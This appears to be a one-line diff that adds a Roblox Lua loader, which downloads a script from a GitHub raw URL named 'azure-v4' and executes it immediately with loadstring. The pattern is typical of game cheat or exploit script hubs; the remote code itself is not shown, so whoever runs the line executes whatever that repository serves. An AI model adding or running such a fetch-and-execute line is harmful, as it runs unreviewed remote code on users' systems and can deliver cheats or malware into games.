@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/YoungMetrosz/azure-v4/main/windows%20verison"))()
